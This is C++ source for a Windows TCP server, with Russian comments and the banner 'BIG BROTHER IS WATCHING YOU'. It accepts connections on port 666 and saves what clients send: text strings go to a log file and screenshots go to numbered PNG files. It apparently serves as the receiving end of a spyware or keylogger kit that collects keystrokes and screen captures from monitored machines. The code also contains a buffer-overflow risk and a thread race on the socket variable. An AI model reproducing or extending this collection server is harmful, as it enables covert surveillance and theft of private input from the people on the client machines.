
// g++ server.cpp -o server  -lws2_32

#include <iostream>
#include <winsock2.h>
#include <fstream>

using namespace std;

#define MY_PORT 666

DWORD WINAPI SexToClient(LPVOID client_socket);

int nclients = 0;
int img_index = 0;

ofstream log("log.dat", ios::app);

int main(int argc, char* argv[]) {

    SetConsoleOutputCP(1251);

    char buff[1024];

    cout << "BIG BROTHER IS WATCHING YOU" << endl;

    if (WSAStartup(0x0202, (WSADATA *) buff)) {
        cout << "Error WSAStartup %d" << WSAGetLastError() << endl;
        return -1;
    }

    SOCKET mysocket;
    // AF_INET     - сокет Интернета
    // SOCK_STREAM  - потоковый сокет (с установкой соединения)
    // 0      - по умолчанию выбирается TCP протокол
    if ((mysocket = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        cout << "Error socket: " << WSAGetLastError() << endl;
        WSACleanup();
        return -1;
    }

    sockaddr_in local_addr;
    local_addr.sin_family = AF_INET;
    local_addr.sin_port = htons(MY_PORT);
    local_addr.sin_addr.s_addr = 0;

    // вызываем bind для связывания
    if (bind(mysocket,(sockaddr *) &local_addr, sizeof(local_addr))) {
        cout << "Error bind: " << WSAGetLastError() << endl;
        closesocket(mysocket);
        WSACleanup();
        return -1;
    }

    // ожидание подключений
    if (listen(mysocket, SOMAXCONN) == SOCKET_ERROR) {
        cout << "Error listen: " << WSAGetLastError() << endl;
        closesocket(mysocket);
        WSACleanup();
        return -1;
    }

    cout << "Waiting..." << endl;

    SOCKET client_socket;
    sockaddr_in client_addr;

    int client_addr_size = sizeof(client_addr);

    while ((client_socket = accept(mysocket, (sockaddr *)&client_addr, &client_addr_size))) {
        nclients++;
        cout  << inet_ntoa(client_addr.sin_addr) << "new connect!" << endl;
        DWORD thID;
        CreateThread(NULL, NULL, SexToClient, &client_socket, NULL, &thID);
    }
    return 0;
}

static int recv_image(SOCKET sock, int size, char *buf){
    char name[100];
    sprintf(name, "%s%d%s", "server_img/screen\0", img_index, ".png\0");
    FILE *image = fopen(name, "wb");
    fwrite(buf, sizeof(char), size, image);
    fclose(image);
    ++img_index;
    cout << "Converting byte array to image done." << endl;
    return 0;
}

DWORD WINAPI SexToClient(LPVOID client_socket) {
    SOCKET my_sock = ((SOCKET *)client_socket)[0];
    char buff[1024 * 220];
    int bytes_recv;
    bool is_str = false;
    bool is_msg = false;
    int size = 0;
    ofstream id("id.dat", ios::app);;
    while ((bytes_recv = recv(my_sock, buff, sizeof(buff), 0)) && bytes_recv != SOCKET_ERROR) {
        if (size > 0) {
            recv_image(my_sock, size, buff);
            size = 0;
            continue;
        }
        buff[bytes_recv] = '\0';
        if (strcmp(buff, "str\0") == 0) {
            is_str = true;
            continue;
        } else if (strcmp(buff, "img\0") == 0) {
            is_msg = true;
            continue;
        }
        if (is_str) {
            log << buff;
            log.flush();
            is_str = false;
            cout << buff;
            continue;
        }
        if (is_msg) {
            size = atoi(buff);
            is_msg = false;
            continue;
        }
        id << buff << std::flush;
        // send(my_sock, buff, bytes_recv, 0);
    }

    --nclients;

    cout << "-disconnect" << endl;

    closesocket(my_sock);

    return 0;
}
